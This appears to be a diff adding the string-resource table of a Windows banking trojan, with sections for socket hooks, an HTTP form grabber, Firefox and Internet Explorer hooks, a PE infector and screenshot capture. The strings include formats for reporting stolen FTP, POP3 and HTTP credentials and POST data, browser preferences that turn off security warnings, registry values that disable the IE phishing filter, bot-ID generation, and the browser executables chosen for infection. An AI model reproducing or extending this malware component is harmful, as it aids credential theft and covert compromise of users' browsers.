@@ -1,0 +1,102 @@
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// sockethook.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+sockethook_report_format      "%s://%s:%s@%s/"
+sockethook_report_prefix_ftp  "ftp"
+sockethook_report_prefix_pop3 "pop3"
+sockethook_user_anonymous     "anonymous"
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// httpgrabber.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+captcha_filename_format           "captcha_%d.%s"
+captcha_mimetype_png              "image/png"
+captcha_mimetype_gif              "image/gif"
+captcha_encoding_gzip             "gzip"
+captcha_jpeg                      "jpeg"
+captcha_png                       "png"
+captcha_gif                       "gif"
+captcha_gzip                      ".gz"
+httpgrabber_request_ct            "Content-Type: %s\r\n"
+httpgrabber_urlencoded            "application/x-www-form-urlencoded"
+httpgrabber_auth_normal           "HTTP authentication: username=\"%s\", password=\"%s\"\n"
+httpgrabber_auth_encoded          "HTTP authentication (encoded): %S\n"
+httpgrabber_report_format         "%s\nReferer: %S\n%sPOST data:\nUserInput:%s\n\n%S"
+httpgrabber_inject_path_format    "grabbed\\%S_%02u_%02u_%02u.txt"
+httpgrabber_inject_grabbed_format "Grabbed data from: %s\n\n%S"
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// nspr4hook.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+nspr4_nspr4dll                  "nspr4.dll"
+nspr4_nss3                      "nss3.dll"
+nspr4_prgetnameforidentity      "PR_GetNameForIdentity"
+nspr4_prseterror                "PR_SetError"
+nspr4_prgeterror                "PR_GetError"
+nspr4_firefox_home_path         "Mozilla\\Firefox"
+nspr4_firefox_file_userjs       "user.js"
+nspr4_firefox_file_profiles     "profiles.ini"
+nspr4_firefox_profile_id_format "Profile%u"
+nspr4_firefox_profile_relative  "IsRelative"
+nspr4_firefox_profile_path      "Path"
+nspr4_firefox_prefs_security    "user_pref(\"network.cookie.cookieBehavior\", 0);\r\nuser_pref(\"privacy.clearOnShutdown.cookies\", false);\r\nuser_pref(\"security.warn_viewing_mixed\", false);\r\nuser_pref(\"security.warn_viewing_mixed.show_once\", false);\r\nuser_pref(\"security.warn_submit_insecure\", false);\r\nuser_pref(\"security.warn_submit_insecure.show_once\", false);\r\n"
+nspr4_firefox_prefs_homepage    "user_pref(\"browser.startup.homepage\", \"%s\");\r\nuser_pref(\"browser.startup.page\", 1);\r\n"
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// wininethook.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+regpath_ie_phishingfilter         "Software\\Microsoft\\Internet Explorer\\PhishingFilter"
+regvalue_ie_phishingfilter1       "Enabled"
+regvalue_ie_phishingfilter2       "EnabledV8"
+regvalue_ie_phishingfilter3       "EnabledV9"
+wininethook_http_acceptencoding   "Accept-Encoding: identity\r\n"
+wininethook_http_te               "TE:\r\n"
+wininethook_http_ifmodified       "If-Modified-Since:\r\n"
+path_wininet_cookie_low           "Low"
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// winapitables.cpp
+////////////////////////////////////////////////////////////////////////////////////////////////////
+winapitables_propentcpsocket         "PR_OpenTCPSocket"
+winapitables_prclose                 "PR_Close"
+winapitables_prread                  "PR_Read"
+winapitables_prwrite                 "PR_Write"
+
+winapitables_prpoll                  "PR_Poll"
+
+winapitables_xpcom                   "xpcom.dll"
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// osenv.cpp
+////////////////////////////////////////////////////////////////////////////////////////////////////
+osenv_regpath_profilelist            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\%s"
+osenv_regvalue_profilelist_path      "ProfileImagePath"
+osenv_botid_regkey                   "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
+osenv_botid_regvalue_1               "InstallDate"
+osenv_botid_regvalue_2               "DigitalProductId"
+osenv_botid_format                   "%s_%08X%08X"
+osenv_botid_format_error             "fatal_error"
+osenv_botid_unknown                  "unknown"
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// DllCore.cpp
+////////////////////////////////////////////////////////////////////////////////////////////////////
+dllcore_firefox                       "firefox.exe"
+dllcore_iexplore                      "iexplore.exe"
+dllcore_explorer                      "explorer.exe"
+dllcore_loadlibrarya				  "LoadLibraryA"
+dllcore_getprocaddress				  "GetProcAddress"
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// peinfector.cpp
+////////////////////////////////////////////////////////////////////////////////////////////////////
+peinfector_wantedfiles_ie             "Internet Explorer\\iexplore.exe"
+peinfector_wantedfiles_ff             "Mozilla Firefox\\firefox.exe"
+peinfector_wantedfiles_chrome         "Google\\\Chrome\\\Application\\chrome.exe"
+peinfector_dll_extension              ".dll"
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// userhook.cpp
+////////////////////////////////////////////////////////////////////////////////////////////////////
+userhook_screenshot_path_format         "screenshots\\%s\\%04x_%08x.jpg"
+userhook_screenshot_file_default_prefix "unknown"
+userhook_screenshot_format              "image/jpeg"
